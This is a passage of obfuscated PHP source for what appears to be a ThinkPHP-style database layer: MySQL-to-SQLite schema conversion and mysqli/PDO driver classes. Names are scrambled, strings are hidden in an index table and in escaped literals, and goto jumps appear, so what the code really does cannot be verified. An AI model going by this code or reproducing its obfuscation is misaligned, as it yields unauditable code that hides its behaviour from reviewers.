$šÏÊ÷¾ş[$®×€Úäê[13]] . PHP_EOL . PHP_EOL); if (!in_array($í“Ä·°ö, $”Ú²¯¬Ò)) { fwrite($¬Á÷â¿û, $šÏÊ÷¾ş[$®×€Úäê[924]] . PHP_EOL . PHP_EOL); } } } else { foreach ($«åî–• as $í“Ä·°ö) { $šÏÊ÷¾ş = $this->sqlFromMysql($í“Ä·°ö); if (!$šÏÊ÷¾ş[$®×€Úäê[924]]) { continue; } fwrite($¬Á÷â¿û, $šÏÊ÷¾ş[$®×€Úäê[924]] . PHP_EOL . PHP_EOL); if (!in_array($í“Ä·°ö, $”Ú²¯¬Ò)) { fwrite($É±±„¾•, $šÏÊ÷¾ş[$®×€Úäê[13]] . PHP_EOL . PHP_EOL); } } } fclose($¬Á÷â¿û); fclose($É±±„¾•); $´ı‹á«ñ = array($®×€Úäê[924] => $ÄóÕÊçç, $®×€Úäê[13] => $õ¯Û“ Â); return $ƒÆÒ¢Š ? $´ı‹á«ñ[$ƒÆÒ¢Š] : $´ı‹á«ñ; } public function dbType($ğ¡ƒéİª = false) { $¬ù¡°¡õ =& $_SERVER[¬ÏÕ§Áú]; $ØŒ›ñÄ = $ğ¡ƒéİª ? $GLOBALS[$¬ù¡°¡õ[6]][$¬ù¡°¡õ[21]] : $this->database; $ØŒ›ñÄ = array_change_key_case($ØŒ›ñÄ); $è·¡ã‡ = $ØŒ›ñÄ[$¬ù¡°¡õ[1092]]; if ($è·¡ã‡ == $¬ù¡°¡õ[1089]) { $ÈÀ»òöô = explode($¬ù¡°¡õ[4], $ØŒ›ñÄ[$¬ù¡°¡õ[1098]]); $è·¡ã‡ = $ÈÀ»òöô[0]; } $Ã€Íä¬Ï = array($¬ù¡°¡õ[1224] => $¬ù¡°¡õ[13], $¬ù¡°¡õ[1037] => $¬ù¡°¡õ[924]); if (isset($Ã€Íä¬Ï[$è·¡ã‡])) { $è·¡ã‡ = $Ã€Íä¬Ï[$è·¡ã‡]; } return $è·¡ã‡; } public function sqlFromMysql($õ½á¾±°, $¶ªØˆéî = '') { $²¨Å ûö =& $_SERVER[¬ÏÕ§Áú]; $˜ªì¦å = array($²¨Å ûö[924] => $²¨Å ûö[12], $²¨Å ûö[13] => $²¨Å ûö[12]); $¥ÃÓÁäÊ = $this->escapeName($õ½á¾±°); $›ñ«Ş–Ü = $this->escapeName($õ½á¾±°, $²¨Å ûö[13]); $Î‚ÙäÀ = $this->model()->db(); $ÕÆ’îô = $Î‚ÙäÀ->query("\163\x68\x6f\x77\40\x63\162\x65\141\164\145\40\164\x61\142\x6c\x65\x20{$¥ÃÓÁäÊ}\73"); if (!$ÕÆ’îô || !$ÕÆ’îô[0]) { return !1; } $ğÕ¹ìò† = _get($ÕÆ’îô[0], $²¨Å ûö[1225], $²¨Å ûö[12]); if (!$ğÕ¹ìò†) { return !1; } $÷¨¹„öĞ = "\104\x52\x4f\120\40\x54\x41\x42\114\105\x20\111\106\x20\105\x58\111\x53\x54\x53\40{$¥ÃÓÁäÊ}\x3b" . PHP_EOL . $ğÕ¹ìò† . $²¨Å ûö[84]; if ($¶ªØˆéî == $²¨Å ûö[924]) { return $÷¨¹„öĞ; } $˜ªì¦å[$²¨Å ûö[924]] = $÷¨¹„öĞ; $’«Í‹òœ = array_change_key_case($GLOBALS[$²¨Å ûö[6]][$²¨Å ûö[21]]); $¸øŸÈãƒ = $’«Í‹òœ[$²¨Å ûö[1097]]; $šÚ›…„ = $²¨Å ûö[1226] . $¸øŸÈãƒ . "\x27\x20\101\x4e\104\40\124\101\102\114\x45\137\116\101\x4d\105\x20\75\x20{$›ñ«Ş–Ü}\73"; $Ëá•ÔÇ£ = "\123\x48\x4f\x57\x20\x49\116\104\105\130\x20\x46\x52\x4f\x4d\x20{$¥ÃÓÁäÊ}\73"; $¬ÆÉç® = $Î‚ÙäÀ->query($šÚ›…„); if (empty($¬ÆÉç®)) { return $¶ªØˆéî ? $˜ªì¦å[$¶ªØˆéî] : $˜ªì¦å; } $Ş€³¡µí = $Î‚ÙäÀ->query($Ëá•ÔÇ£); $Ÿ²–È¦ = $²¨Å ûö[12]; $­Ûì¹õ = array(); foreach ($Ş€³¡µí as $ÄïÎêœ£) { if (!$Ÿ²–È¦ && $ÄïÎêœ£[$²¨Å ûö[1227]] == $²¨Å ûö[1228]) { $Ÿ²–È¦ = $ÄïÎêœ£[$²¨Å ûö[1229]]; } if (isset($­Ûì¹õ[$ÄïÎêœ£[$²¨Å ûö[1227]]])) { $­Ûì¹õ[$ÄïÎêœ£[$²¨Å ûö[1227]]][$²¨Å ûö[1230]][] = $ÄïÎêœ£[$²¨Å ûö[1229]]; continue; } $­Ûì¹õ[$ÄïÎêœ£[$²¨Å ûö[1227]]] = array($²¨Å ûö[1231] => $ÄïÎêœ£[$²¨Å ûö[1227]], $²¨Å ûö[1230] => array($ÄïÎêœ£[$²¨Å ûö[1229]]), $²¨Å ûö[1232] => $ÄïÎêœ£[$²¨Å ûö[1233]] == $²¨Å ûö[101] ? 0 : 1); } $Éı‡’œ = array(); foreach ($­Ûì¹õ as $ÄïÎêœ£) { $éÀ¤ï† = $ÄïÎêœ£[$²¨Å ûö[1231]] == $²¨Å ûö[1228]; $‚©úû¼ø = $ÄïÎêœ£[$²¨Å ûö[1232]] == $²¨Å ûö[101] && !$éÀ¤ï† ? $²¨Å ûö[1234] : $²¨Å ûö[12]; $ «Ù¹Ê = $²¨Å ûö[1235] . $õ½á¾±° . $²¨Å ûö[11] . ($éÀ¤ï† ? $²¨Å ûö[1236] : $ÄïÎêœ£[$²¨Å ûö[1231]]); $û­«§´Ô = $²¨Å ûö[1237] . implode($²¨Å ûö[1238], $ÄïÎêœ£[$²¨Å ûö[1230]]) . $²¨Å ûö[1239]; $Éı‡’œ[] = sprintf($²¨Å ûö[1240], $²¨Å ûö[1241], $‚©úû¼ø, $²¨Å ûö[1242], $ «Ù¹Ê, $²¨Å ûö[1243], $û­«§´Ô); } $ÍµÃæÊó = array(); $ÂÛã¡ùÂ = array($²¨Å ûö[1244] => $²¨Å ûö[401], $²¨Å ûö[1245] => $²¨Å ûö[401], $²¨Å ûö[375] => $²¨Å ûö[401], $²¨Å ûö[374] => $²¨Å ûö[401], $²¨Å ûö[1246] => $²¨Å ûö[1247], $²¨Å ûö[1248] => $²¨Å ûö[1247], $²¨Å ûö[1247] => $²¨Å ûö[1247], $²¨Å ûö[1249] => $²¨Å ûö[1247], $²¨Å ûö[295] => $²¨Å ûö[1247], $²¨Å ûö[1250] => $²¨Å ûö[1247], $²¨Å ûö[1251] => $²¨Å ûö[1247], $²¨Å ûö[1252] => $²¨Å ûö[1253], $²¨Å ûö[376] => $²¨Å ûö[1253], $²¨Å ûö[377] => $²¨Å ûö[1253], $²¨Å ûö[1254] => $²¨Å ûö[1254]); foreach ($¬ÆÉç® as $ÄïÎêœ£) { $¶ªØˆéî = _get($ÂÛã¡ùÂ, $ÄïÎêœ£[$²¨Å ûö[1255]], $ÄïÎêœ£[$²¨Å ûö[1256]]); $¾¦Â·ÂØ = $ÄïÎêœ£[$²¨Å ûö[1257]] == $²¨Å ûö[1020] ? $²¨Å ûö[1258] : $²¨Å ûö[1259]; $éûêÜ’¸ = $ÄïÎêœ£[$²¨Å ûö[1260]] == $Ÿ²–È¦ ? $²¨Å ûö[1261] : $²¨Å ûö[12]; $®Şàù“Ø = $ÄïÎêœ£[$²¨Å ûö[1074]] ? strtoupper(str_replace($²¨Å ûö[11], $²¨Å ûö[12], $ÄïÎêœ£[$²¨Å ûö[1074]])) : $²¨Å ûö[12]; $ÍµÃæÊó[] = sprintf($²¨Å ûö[1262], $ÄïÎêœ£[$²¨Å ûö[1260]], $¶ªØˆéî, $¾¦Â·ÂØ, $éûêÜ’¸, $®Şàù“Ø); } $Ó¹Ø½ôñ = array("\104\x52\x4f\120\x20\124\x41\x42\x4c\105\x20\111\x46\40\x45\x58\111\123\124\123\x20{$›ñ«Ş–Ü}\x3b", "\103\122\x45\x41\124\x45\x20\x54\x41\x42\114\105\40{$›ñ«Ş–Ü}\x20\50", implode($²¨Å ûö[50] . PHP_EOL, $ÍµÃæÊó), $²¨Å ûö[1263]); $Ç ¡­€Õ = implode(PHP_EOL, array_merge($Ó¹Ø½ôñ, $Éı‡’œ)); if ($¶ªØˆéî == $²¨Å ûö[13]) { return $Ç ¡­€Õ; } $˜ªì¦å[$²¨Å ûö[13]] = $Ç ¡­€Õ; return $˜ªì¦å; } public function sqlFromSqlite($ô“Ã—ö, $§ƒ¬ = '') { $Ù™àş©ç =& $_SERVER[¬ÏÕ§Áú]; $ƒë ÃÅ’ = array($Ù™àş©ç[924] => $Ù™àş©ç[12], $Ù™àş©ç[13] => $Ù™àş©ç[12]); $ŒÛßÓğÈ = $this->escapeName($ô“Ã—ö); $Ú¨ı†êÍ = $this->escapeName($ô“Ã—ö, $Ù™àş©ç[13]); $¶šàŸ€¡ = $this->model()->db(); $¾°ğáì¾ = "\120\x52\101\107\115\101\x20\x54\x41\102\114\105\137\x49\116\x46\x4f\40\50\x27{$ô“Ã—ö}\x27\51"; $ªüìÀü = "\x53\105\114\105\103\x54\x20\52\40\106\122\x4f\x4d\40\x73\161\154\x69\164\x65\x5f\155\141\163\x74\x65\x72\40\x57\110\105\x52\105\40\x74\142\x6c\x5f\156\141\x6d\x65\40\x3d\x20\x27{$ô“Ã—ö}\x27"; $Î‚ËÈú€ = $¶šàŸ€¡->query($¾°ğáì¾); if (empty($Î‚ËÈú€)) { return $§ƒ¬ ? $ƒë ÃÅ’[$§ƒ¬] : $ƒë ÃÅ’; } $’è’ Ê€ = $¶šàŸ€¡->query($ªüìÀü); $Ï¾”æ¼´ = $›ßÑñĞ = array(); foreach ($’è’ Ê€ as $³¾ùêÜÁ) { if ($³¾ùêÜÁ[$Ù™àş©ç[33]] == $Ù™àş©ç[368]) { $Ï¾”æ¼´[] = $³¾ùêÜÁ[$Ù™àş©ç[1264]]; } else { $›ßÑñĞ[$³¾ùêÜÁ[$Ù™àş©ç[32]]] = $³¾ùêÜÁ[$Ù™àş©ç[1264]]; } } $âÍıÓş = array_merge(array("\x44\x52\117\120\x20\x54\x41\x42\x4c\105\40\x49\106\x20\x45\x58\x49\x53\124\x53\x20{$Ú¨ı†êÍ}\x3b"), $Ï¾”æ¼´, array_values($›ßÑñĞ)); $âÍıÓş = implode($Ù™àş©ç[84] . PHP_EOL, $âÍıÓş) . $Ù™àş©ç[84]; if ($§ƒ¬ == $Ù™àş©ç[13]) { return $âÍıÓş; } $ƒë ÃÅ’[$Ù™àş©ç[13]] = $âÍıÓş; $‚ĞğÙ– = array(); $ËÀÓ—™„ = array(); foreach ($›ßÑñĞ as $ˆ úÚÎÀ => $õ¦°Úıü) { $Ç”’ÑËè = str_replace($Ù™àş©ç[1235] . $ô“Ã—ö . $Ù™àş©ç[11], $Ù™àş©ç[12], $ˆ úÚÎÀ); $Ç”’ÑËè = str_replace($ô“Ã—ö . $Ù™àş©ç[11], $Ù™àş©ç[12], $Ç”’ÑËè); $çÙçùÆü = str_replace(array($Ù™àş©ç[131], $Ù™àş©ç[1082]), $Ù™àş©ç[481], substr($õ¦°Úıü, stripos($õ¦°Úıü, $Ù™àş©ç[349]))); $‚ĞğÙ–[$Ç”’ÑËè] = $çÙçùÆü; $ËÀÓ—™„[$Ç”’ÑËè] = $õ¦°Úıü; } $Ößú³ğÓ = array(); $ƒ’²òÑ = array(); $Â™Îï¢ = array($Ù™àş©ç[1245] => $Ù™àş©ç[1265], $Ù™àş©ç[401] => $Ù™àş©ç[1266], $Ù™àş©ç[1253] => $Ù™àş©ç[1267], $Ù™àş©ç[1247] => $Ù™àş©ç[1249], $Ù™àş©ç[1254] => $Ù™àş©ç[1268]); $ïççóê = $õÉÔÉ¼– = $Ù™àş©ç[12]; foreach ($Î‚ËÈú€ as $³¾ùêÜÁ) { $„Úç±‹ = $³¾ùêÜÁ[$Ù™àş©ç[33]]; if ($„Úç±‹ == $Ù™àş©ç[1247] && isset($‚ĞğÙ–[$³¾ùêÜÁ[$Ù™àş©ç[32]]])) { $„Úç±‹ = $Ù™àş©ç[1269]; } $ƒ’²òÑ[$³¾ùêÜÁ[$Ù™àş©ç[32]]] = $„Úç±‹; $§ƒ¬ = _get($Â™Îï¢, $„Úç±‹, $„Úç±‹); $İºäÃ¸ = $Ù™àş©ç[12]; if ($³¾ùêÜÁ[$Ù™àş©ç[57]] == $Ù™àş©ç[101]) { if (stripos($„Úç±‹, $Ù™àş©ç[375]) !== !1) { $İºäÃ¸ = $Ù™àş©ç[1270]; } $ïççóê = $³¾ùêÜÁ[$Ù™àş©ç[32]]; } $¹ïÖø®‹ = $³¾ùêÜÁ[$Ù™àş©ç[56]] === null ? $Ù™àş©ç[1271] : (is_string($³¾ùêÜÁ[$Ù™àş©ç[56]]) ? "\x27{$³¾ùêÜÁ[$Ù™àş©ç[56]]}\47" : $³¾ùêÜÁ[$Ù™àş©ç[56]]); $œ”é›…Ì = $³¾ùêÜÁ[$Ù™àş©ç[35]] == $Ù™àş©ç[101] ? $Ù™àş©ç[1258] : $Ù™àş©ç[1272] . $¹ïÖø®‹; $Ößú³ğÓ[] = sprintf($Ù™àş©ç[1273], $³¾ùêÜÁ[$Ù™àş©ç[32]], $§ƒ¬, $œ”é›…Ì, $İºäÃ¸); } foreach ($‚ĞğÙ– as $Ç”’ÑËè => $çÙçùÆü) { if (stripos($ËÀÓ—™„[$Ç”’ÑËè], $Ù™àş©ç[1228]) !== !1) { $ÓîÜ¬×Á = $õÉÔÉ¼– = $Ù™àş©ç[1274] . $ïççóê . $Ù™àş©ç[1275]; } else { $É‡Ä™€œ = stripos($ËÀÓ—™„[$Ç”’ÑËè], $Ù™àş©ç[1234]) !== !1; $¨•ª§Ñ = !1; $áºáö÷Ù = array(); $¦½­Àæ = explode($Ù™àş©ç[50], rtrim(ltrim($çÙçùÆü, $Ù™àş©ç[349]), $Ù™àş©ç[1027])); foreach ($¦½­Àæ as $ˆ úÚÎÀ) { $ˆ úÚÎÀ = trim($ˆ úÚÎÀ, $Ù™àş©ç[1022]); if (isset($ƒ’²òÑ[$ˆ úÚÎÀ]) && $ƒ’²òÑ[$ˆ úÚÎÀ] == $Ù™àş©ç[1269]) { $¨•ª§Ñ = !0; $áºáö÷Ù[] = "\140{$ˆ úÚÎÀ}\140\50\62\x35\x30\x29"; } else { $áºáö÷Ù[] = "\140{$ˆ úÚÎÀ}\140"; } } if ($¨•ª§Ñ) { $çÙçùÆü = $Ù™àş©ç[349] . implode($Ù™àş©ç[50], $áºáö÷Ù) . $Ù™àş©ç[1027]; } $ÓîÜ¬×Á = ($É‡Ä™€œ ? $Ù™àş©ç[1276] : $Ù™àş©ç[12]) . "\113\x45\131\x20\140{$Ç”’ÑËè}\x60\40{$çÙçùÆü}"; } $Ößú³ğÓ[] = $ÓîÜ¬×Á; } if ($ïççóê && !$õÉÔÉ¼–) { $Ößú³ğÓ = array_merge(array($Ù™àş©ç[1274] . $ïççóê . $Ù™àş©ç[1275]), $Ößú³ğÓ); } $üİõÊº = array("\x44\x52\x4f\120\40\124\x41\x42\114\x45\x20\111\106\40\105\x58\111\x53\x54\x53\x20{$ŒÛßÓğÈ}\73", "\x43\122\x45\101\x54\105\40\x54\x41\102\114\x45\40{$ŒÛßÓğÈ}\x20\50", implode($Ù™àş©ç[50] . PHP_EOL, $Ößú³ğÓ), $Ù™àş©ç[1277]); $ÙÊÇıä¬ = implode(PHP_EOL, $üİõÊº); if ($§ƒ¬ == $Ù™àş©ç[924]) { return $ÙÊÇıä¬; } $ƒë ÃÅ’[$Ù™àş©ç[924]] = $ÙÊÇıä¬; return $ƒë ÃÅ’; } private function escapeName($€½àıã, $íá™•á  = "\x6d\x79\x73\161\x6c") { $±ÈÑÁ¦ú =& $_SERVER[¬ÏÕ§Áú]; $€½àıã = preg_replace($±ÈÑÁ¦ú[1278], $±ÈÑÁ¦ú[12], $€½àıã); if ($íá™•á  === $±ÈÑÁ¦ú[924]) { return "\x60{$€½àıã}\x60"; } return "\x22{$€½àıã}\x22"; } } goto Aš½İö§ê’; eËõ™Ü¤¥Á: class DbMysqli extends Db { public function __construct($±ì…İ’õ = '') { $Å–İòÚá =& $_SERVER[¬ÏÕ§Áú]; if (!extension_loaded($Å–İòÚá[1037])) { think_exception(think_lang($Å–İòÚá[14]) . $Å–İòÚá[1038]); } if (!empty($±ì…İ’õ)) { $this->config = $±ì…İ’õ; if (empty($this->config[$Å–İòÚá[17]])) { $this->config[$Å–İòÚá[17]] = $Å–İòÚá[12]; } } } public function connect($ˆ…íé¬ö = '', $¯É–óİÓ = 0) { $‰î™ÕË‡ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->linkID[$¯É–óİÓ])) { if (empty($ˆ…íé¬ö)) { $ˆ…íé¬ö = $this->config; } $this->linkID[$¯É–óİÓ] = new mysqli($ˆ…íé¬ö[$‰î™ÕË‡[1008]], $ˆ…íé¬ö[$‰î™ÕË‡[1010]], $ˆ…íé¬ö[$‰î™ÕË‡[1011]], $ˆ…íé¬ö[$‰î™ÕË‡[21]], $ˆ…íé¬ö[$‰î™ÕË‡[1009]] ? intval($ˆ…íé¬ö[$‰î™ÕË‡[1009]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÉÎãæÒç = $this->linkID[$¯É–óİÓ]->server_version; $this->linkID[$¯É–óİÓ]->query($‰î™ÕË‡[1012] . think_config($‰î™ÕË‡[1013]) . $‰î™ÕË‡[58]); if ($ÉÎãæÒç > $‰î™ÕË‡[1014]) { $this->linkID[$¯É–óİÓ]->query($‰î™ÕË‡[1015]); } $this->connected = !0; if (1 != think_config($‰î™ÕË‡[22])) { unset($this->config); } } return $this->linkID[$¯É–óİÓ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ßôÅ·ßë) { $ûù¢»Ş =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßôÅ·ßë; if ($this->queryID) { $this->free(); } think_action_status($ûù¢»Ş[23], 1); think_status($ûù¢»Ş[24]); $this->queryID = $this->_linkID->query($ßôÅ·ßë); if ($this->_linkID->more_results()) { while (($‘Ù¿ ßĞ = $this->_linkID->next_result()) != NULL) { $‘Ù¿ ßĞ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¥ëØ¹œ) { $óê‹¾¦“ =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥ëØ¹œ; if ($this->queryID) { $this->free(); } think_action_status($óê‹¾¦“[25], 1); think_status($óê‹¾¦“[24]); $–¼ºñô = $this->_linkID->query($¥ëØ¹œ); $this->debug(); if (!1 === $–¼ºñô) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…Á¢Ÿõ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$…Á¢Ÿõ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $³õ€¡È¦ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$³õ€¡È¦) { $this->error(); return !1; } } return !0; } private function getAll() { $®•ì¥î = array(); if ($this->numRows > 0) { for ($ÕÛ°•í± = 0; $ÕÛ°•í± < $this->numRows; $ÕÛ°•í±++) { $®•ì¥î[$ÕÛ°•í±] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $®•ì¥î; } public function getFields($€»ìãÂ) { $İ·„—šš =& $_SERVER[¬ÏÕ§Áú]; $†Àô ¨÷ = $this->query($İ·„—šš[1019] . $this->parseKey($€»ìãÂ)); $ªÆİö© = array(); if ($†Àô ¨÷) { foreach ($†Àô ¨÷ as $åı®ÏÃ¼ => $î¨ñ°±³) { $ªÆİö©[$î¨ñ°±³[$İ·„—šš[31]]] = array($İ·„—šš[32] => $î¨ñ°±³[$İ·„—šš[31]], $İ·„—šš[33] => $î¨ñ°±³[$İ·„—šš[34]], $İ·„—šš[35] => (bool) ($î¨ñ°±³[$İ·„—šš[36]] === $İ·„—šš[12]), $İ·„—šš[37] => $î¨ñ°±³[$İ·„—šš[38]], $İ·„—šš[39] => strtolower($î¨ñ°±³[$İ·„—šš[40]]) == $İ·„—šš[41], $İ·„—šš[42] => strtolower($î¨ñ°±³[$İ·„—šš[43]]) == $İ·„—šš[44]); } } return $ªÆİö©; } public function getTables($êÌò¼üÈ = '') { $úŸ‹°”™ =& $_SERVER[¬ÏÕ§Áú]; $Äİ¥²ğ… = !empty($êÌò¼üÈ) ? $úŸ‹°”™[1021] . $êÌò¼üÈ . $úŸ‹°”™[1022] : $úŸ‹°”™[1023]; $ïã¦–ÌÃ = $this->query($Äİ¥²ğ…); $êÏçïå… = array(); if ($ïã¦–ÌÃ) { foreach ($ïã¦–ÌÃ as $ºè¦ƒ¿ => $Íßîãê©) { $êÏçïå…[$ºè¦ƒ¿] = current($Íßîãê©); } } return $êÏçïå…; } public function replace($ÓÃÅà¿è, $¿øÊÊ‹ = array()) { $â·êãÏä =& $_SERVER[¬ÏÕ§Áú]; foreach ($ÓÃÅà¿è as $ÅÔ± => $¿÷÷ŸŸ) { $‘ÎĞå‚¨ = $this->parseValue($¿÷÷ŸŸ); if (is_scalar($‘ÎĞå‚¨)) { $×ß‚Óíˆ[] = $‘ÎĞå‚¨; $Ñ»¤„ÕŠ[] = $this->parseKey($ÅÔ±); } } $˜êÖ»˜û = $â·êãÏä[1024] . $this->parseTable($¿øÊÊ‹[$â·êãÏä[368]]) . $â·êãÏä[1025] . implode($â·êãÏä[50], $Ñ»¤„ÕŠ) . $â·êãÏä[1026] . implode($â·êãÏä[50], $×ß‚Óíˆ) . $â·êãÏä[1027]; return $this->execute($˜êÖ»˜û); } public function insertAll($å×²ïËÌ, $¾€³ÄÉÀ = array(), $ç”™«Ğ = false) { $ä¬ÀßÅ´ =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($å×²ïËÌ[0])) { return !1; } $ÄÌß¯ìé = array_keys($å×²ïËÌ[0]); $šÁ¬ÙìÊ = array(); foreach ($å×²ïËÌ as $ø•È²ÊË) { $‡µ¾ªİ¸ = array(); foreach ($ø•È²ÊË as $úªÊŠËù => $ùº †œô) { $ùº †œô = $this->parseValue($ùº †œô); if (is_scalar($ùº †œô)) { $‡µ¾ªİ¸[] = $ùº †œô; } } $šÁ¬ÙìÊ[] = $ä¬ÀßÅ´[349] . implode($ä¬ÀßÅ´[50], $‡µ¾ªİ¸) . $ä¬ÀßÅ´[1027]; } array_walk($ÄÌß¯ìé, array($this, $ä¬ÀßÅ´[1028])); $à’Ÿ–Ö‰ = $ç”™«Ğ ? $ä¬ÀßÅ´[1029] : $ä¬ÀßÅ´[1030]; $à’Ÿ–Ö‰ = $ä¬ÀßÅ´[1030]; $§ßƒËçÔ = $à’Ÿ–Ö‰ . $ä¬ÀßÅ´[1031] . $this->parseTable($¾€³ÄÉÀ[$ä¬ÀßÅ´[368]]) . $ä¬ÀßÅ´[1025] . implode($ä¬ÀßÅ´[50], $ÄÌß¯ìé) . $ä¬ÀßÅ´[1032] . implode($ä¬ÀßÅ´[50], $šÁ¬ÙìÊ); if ($ç”™«Ğ) { $ øè¶› = array(); foreach ($ÄÌß¯ìé as $úªÊŠËù) { if ($úªÊŠËù == $ä¬ÀßÅ´[244] || $úªÊŠËù == $ä¬ÀßÅ´[1033]) { continue; } $ øè¶›[] = $úªÊŠËù . $ä¬ÀßÅ´[1034] . $úªÊŠËù . $ä¬ÀßÅ´[1027]; } $§ßƒËçÔ .= $ä¬ÀßÅ´[1035] . implode($ä¬ÀßÅ´[50], $ øè¶›); } return $this->execute($§ßƒËçÔ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÍÒÎ¿Á =& $_SERVER[¬ÏÕ§Áú]; $this->error = $this->_linkID->errno . $ÍÒÎ¿Á[4] . $this->_linkID->error; if ($ÍÒÎ¿Á[12] != $this->queryStr) { $this->error .= LNG($ÍÒÎ¿Á[48]) . $this->queryStr; } think_trace($this->error, $ÍÒÎ¿Á[12], $ÍÒÎ¿Á[49]); return $this->error; } public function escapeString($Î‚õêö) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Î‚õêö); } else { return addslashes($Î‚õêö); } } public function parseKey(&$ÜÚòîÇÁ, $¤ä©ë§ = true) { $ï†ÕæÊ =& $_SERVER[¬ÏÕ§Áú]; if ($¤ä©ë§) { $ÜÚòîÇÁ = $this->parseKeyCheck($ÜÚòîÇÁ); } if ($ÜÚòîÇÁ != $ï†ÕæÊ[233] && !preg_match($ï†ÕæÊ[1036], $ÜÚòîÇÁ)) { $ÜÚòîÇÁ = $ï†ÕæÊ[481] . trim($ÜÚòîÇÁ, $ï†ÕæÊ[481]) . $ï†ÕæÊ[481]; } return $ÜÚòîÇÁ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ñâèË = '') { $ş‘­¬óß =& $_SERVER[¬ÏÕ§Áú]; if (!class_exists($ş‘­¬óß[1039])) { think_exception(think_lang($ş‘­¬óß[14]) . $ş‘­¬óß[1040]); } if (!empty($ñâèË)) { $this->config = $ñâèË; if (empty($this->config[$ş‘­¬óß[17]])) { $this->config[$ş‘­¬óß[17]] = array(); } } } public function connect($†ßĞ†Ãª = '', $Ô¶ĞŒş» = 0) { $¿×»¨æ£ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->linkID[$Ô¶ĞŒş»])) { if (empty($†ßĞ†Ãª)) { $†ßĞ†Ãª = $this->config; } $«°Ñ©ñğ = !empty($†ßĞ†Ãª[$¿×»¨æ£[17]][$¿×»¨æ£[18]]) ? $†ßĞ†Ãª[$¿×»¨æ£[17]][$¿×»¨æ£[18]] : $this->pconnect; if ($«°Ñ©ñğ) { $†ßĞ†Ãª[$¿×»¨æ£[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ô¶ĞŒş»] = new PDO($†ßĞ†Ãª[$¿×»¨æ£[1041]], $†ßĞ†Ãª[$¿×»¨æ£[1010]], $†ßĞ†Ãª[$¿×»¨æ£[1011]], $†ßĞ†Ãª[$¿×»¨æ£[17]]); } catch (PDOException $Üäî‘ª˜) { think_exception($Üäî‘ª˜->getMessage()); } $this->dbType = $this->_getDsnType($†ßĞ†Ãª[$¿×»¨æ£[1041]]); if (in_array($this->dbType, array($¿×»¨æ£[1042], $¿×»¨æ£[1043], $¿×»¨æ£[1044], $¿×»¨æ£[1045]))) { think_exception($¿×»¨æ£[1046] . $this->dbType . $¿×»¨æ£[1047] . $this->dbType . $¿×»¨æ£[1048]); } if (!$this->linkID[$Ô¶ĞŒş»]) { think_exception($¿×»¨æ£[1049]); } try { $this->linkID[$Ô¶ĞŒş»]->exec($¿×»¨æ£[1050] . think_config($¿×»¨æ£[1013])); } catch (Exception $Üäî‘ª˜) { } $this->connected = !0; if (1 != think_config($¿×»¨æ£[22])) { unset($this->config); } } return $this->linkID[$Ô¶ĞŒş»]; } public function free() { $this->PDOStatement = null; } public function query($•™³‘ğ, $å‰´ò‡ = array()) { $€ØÙúë =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•™³‘ğ; if (!empty($å‰´ò‡)) { $this->queryStr .= $€ØÙúë[1051] . print_r($å‰´ò‡, !0) . $€ØÙúë[1052]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€ØÙúë[23], 1); think_status($€ØÙúë[24]); $this->PDOStatement = $this->_linkID->prepare($•™³‘ğ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $·›‘ì¼å = $this->PDOStatement->execute($å‰´ò‡); $this->debug(); if (!1 === $·›‘ì¼å) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‚Ò”¿½†, $°ıšæŒÛ = array()) { $ñ’°ûøÃ =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚Ò”¿½†; if (!empty($°ıšæŒÛ)) { $this->queryStr .= $ñ’°ûøÃ[1051] . print_r($°ıšæŒÛ, !0) . $ñ’°ûøÃ[1052]; } $ÖÒ¤›Õê = !1; if ($this->dbType == $ñ’°ûøÃ[1045]) { if (preg_match($ñ’°ûøÃ[1053], $this->queryStr, $¸ºë‹ş°)) { $this->table = think_config($ñ’°ûøÃ[1054]) . str_ireplace(think_config($ñ’°ûøÃ[1055]), $ñ’°ûøÃ[69], $¸ºë‹ş°[2]); $ÖÒ¤›Õê = (bool) $this->query($ñ’°ûøÃ[1056] . strtoupper($this->table) . $ñ’°ûøÃ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ñ’°ûøÃ[25], 1); think_status($ñ’°ûøÃ[24]); $this->PDOStatement = $this->_linkID->prepare($‚Ò”¿½†); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $œ’òç¢ = $this->PDOStatement->execute($°ıšæŒÛ); $this->debug(); if (!1 === $œ’òç¢) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÖÒ¤›Õê || preg_match($ñ’°ûøÃ[1057], $‚Ò”¿½†)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if 